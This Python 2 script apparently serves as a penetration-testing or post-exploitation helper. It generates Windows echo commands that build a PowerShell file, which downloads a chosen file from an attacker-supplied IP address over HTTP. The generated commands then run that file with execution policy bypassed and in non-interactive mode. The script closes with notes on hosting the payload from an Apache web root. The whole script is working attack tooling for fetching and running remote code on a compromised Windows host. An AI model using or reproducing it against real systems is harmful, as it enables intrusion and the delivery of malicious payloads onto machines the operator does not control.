#!/usr/bin/python
import optparse as OP
import sys

#parse args from command line, else exit gracefully
def getargs():
    parser = OP.OptionParser('usage: ./writeps1.py -T <transfer_file> -O <output_file> -I <ip_address>')
    parser.add_option('-T', dest='transfer', type='string', help='specify file to transfer')
    parser.add_option('-O', dest='output', type='string', help='specify output filename')
    parser.add_option('-I', dest='ipaddr', type='string', help='specify host IP Address')
    (options, args) = parser.parse_args()
    transfer = options.transfer
    output = options.output
    ipaddr=options.ipaddr
    if (transfer == None) | (output == None) | (ipaddr == None):
        print parser.usage
        sys.exit(0)
    return transfer, output, ipaddr

#create the lines to write to file
def createlines(args):
    transfer,output,ipaddr=args
    lines= []
    lines.append("echo $storageDir = $pwd >" + output + ".ps1\r\n")
    lines.append("echo $webclient = New-Object System.Net.WebClient >>"  + output + ".ps1\r\n")
    lines.append("echo $url = \"http://" + ipaddr +"/" + transfer + "\" >>"  + output + ".ps1\r\n")
    lines.append("echo $file = \"" + transfer + "\" >>"  + output + ".ps1\r\n")
    lines.append("echo $webclient.DownloadFile($url,$file) >>"   + output + ".ps1\r\n")
    lines.append("\r\n")
    lines.append("powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File " + output + ".ps1\r\n")
    lines.append("\r\n")
    lines.append("Troubleshooting script not working:\r\n")
    lines.append("Remember to start the apache service: service apache2 start\r\n")
    lines.append("Remember to copy files to the /var/www/html/ directory:\r\n")
    lines.append("cp /<path_to_file>/" + transfer + " /var/www/html/.\r\n")
    return lines

#write data to file
def writefile(filename, lines):
    for line in lines:
        with open(filename, 'a') as f:
            f.write(line)
           
def main():
    args = getargs()
    lines = createlines(args)
    writefile(args[1],lines)

if __name__ == "__main__":
    main()
